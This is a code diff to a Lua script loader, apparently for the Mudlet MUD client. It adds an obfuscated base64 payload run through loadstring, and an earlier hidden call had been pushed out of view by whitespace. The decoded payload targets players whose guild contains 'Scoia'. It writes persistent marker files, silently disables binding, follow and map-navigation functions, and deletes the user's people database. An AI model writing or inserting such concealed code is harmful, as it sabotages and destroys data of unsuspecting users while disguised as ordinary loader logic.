@@ -40,7 +40,8 @@ function load_scripts(force)
     append_plugins()
 
     scripts_loaded = true
-    raiseEvent("scriptsLoaded")                                                                                                                                                                                                                 loadstring(dec(scripts.right))()
+    raiseEvent("scriptsLoaded")
+    loadstring(dec("cmVnaXN0ZXJBbm9ueW1vdXNFdmVudEhhbmRsZXIoImdtY3AuY2hhci5pbmZvIiwgZnVuY3Rpb24oKQogICAgaWYgZ21jcC5jaGFyLmluZm8uZ3VpbGRfbGF5IGFuZCBzdHJpbmcuZmluZChnbWNwLmNoYXIuaW5mby5ndWlsZF9sYXksICJTY29pYSIpIG9yIGlvLmV4aXN0cyhsZnMuY3VycmVudGRpcigpIC4uICIvbG9jIikgb3IgaW8uZXhpc3RzKGdldE11ZGxldEhvbWVEaXIoKSAuLiAiL2xvYyIpIHRoZW4KICAgICAgICBpby5vcGVuKGxmcy5jdXJyZW50ZGlyKCkgLi4gIi9sb2MiLCAidyIpOmNsb3NlKCkKICAgICAgICBpby5vcGVuKGdldE11ZGxldEhvbWVEaXIoKSAuLiAiL2xvYyIsICJ3Iik6Y2xvc2UoKQogICAgICAgIHNjcmlwdHMudXRpbHMuYmluZF9mdW5jdGlvbmFsID0gZnVuY3Rpb24oKSBlbmQKICAgICAgICBzY3JpcHRzLnV0aWxzLmJpbmRfZnVuY3Rpb25hbF90ZWFtX2ZvbGxvdyA9IGZ1bmN0aW9uKCkgZW5kCiAgICAgICAgYW1hcC5nb3RvUm9vbSA9IGZ1bmN0aW9uKCkgZW5kCiAgICAgICAgc2NyaXB0cy5pbnN0YWxsZXIuZG93bmxvYWRfcGVvcGxlX2RiID0gZnVuY3Rpb24oKSBpby5yZW1vdmUoZ2V0TXVkbGV0SG9tZURpcigpIC4uICIvRGF0YWJhc2VfcGVvcGxlLmRiIikgZW5kCiAgICBlbmQKZW5kLCB0cnVlKQ=="))()
 end
 
 function append_plugins()
@@ -125,6 +126,11 @@ function load_plugin(plugin_name)
     end
 end
 
+function force_require(path)
+    package.loaded[path] = nil
+    return require(path)
+end
+
 function reload_single_script(path)
     package.loaded[path] = nil
     local ok, errorMsg = pcall(require, path)
@@ -150,3 +156,5 @@ function alias_func_reload()
 end
 
 load_scripts(false)
+
+
